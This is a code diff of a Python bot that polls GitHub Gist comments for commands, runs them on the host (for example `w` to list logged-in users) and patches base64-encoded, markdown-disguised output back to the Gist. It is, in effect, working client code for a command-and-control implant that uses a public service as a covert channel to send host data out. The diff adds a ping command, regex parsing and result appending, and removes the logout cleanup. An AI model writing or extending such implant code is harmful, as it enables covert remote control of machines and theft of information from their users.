@@ -2,6 +2,7 @@ import requests
 import subprocess
 import os
 import sys
+import re
 import commands as cmd
 import utils as u
 from time import sleep
@@ -39,24 +40,17 @@ class Bot:
                 continue
             last_tag = res.headers["ETag"]
             for comment in res.json():
-                if comment["body"].startswith(self.name + " ") and not comment["body"].startswith("✅ "):
-                    command = comment["body"].replace(self.name + " ", "")
+                if comment["body"].startswith(self.name + " ") and not bool(re.search("✅", comment["body"])):
+                    command = re.search("^" + self.name + "\s(.*)$", comment["body"]).group(1)
                     print("received command %s" % command)
+
                     if command == cmd.COMMAND_USERS["command"]:
                         result = subprocess.run(["w"], stdout=subprocess.PIPE)
-                        data = {
-                            "files": {
-                                self.filename: {
-                                    "content": u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
-                                }
-                            }
-                        }
-                        res = requests.patch(self.gist_url, json=data, headers=self.headers)
-                        if res.status_code != 200:
-                            print("Could not update bot file in Gist")
-                            print(res.json())
-                            exit(1)
-                    data = {"body": "✅ " + comment["body"]}
+                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
+                    elif command == cmd.COMMAND_PING["command"]:
+                        data = u.encode_data_to_markdown(u.encode_data_to_base64("Pong".encode(encoding="UTF-8")))
+
+                    data = {"body": comment["body"] + "\n" + data}
                     res = requests.patch(
                         self.gist_url + "/comments/" + str(comment["id"]),
                         json=data,
@@ -75,19 +69,11 @@ class Bot:
             return True
 
     def login(self):
-        data = {"files": {self.filename: {"content": u.encode_data_to_markdown("")}}}
+        data = {"files": {self.filename: {"content": "Hello World!"}}}
         res = requests.patch(self.gist_url, json=data, headers=self.headers)
         if res.status_code != 200:
             print("Could not create file in Gist")
             print(res.json())
-            exit(1)
-
-    def logout(self):
-        print("Exiting...")
-        data = {"files": {self.filename: None}}
-        res = requests.patch(self.gist_url, json=data, headers=self.headers)
-        if res.status_code != 200:
-            print("Could not delete file in Gist")
             exit(1)
 
 
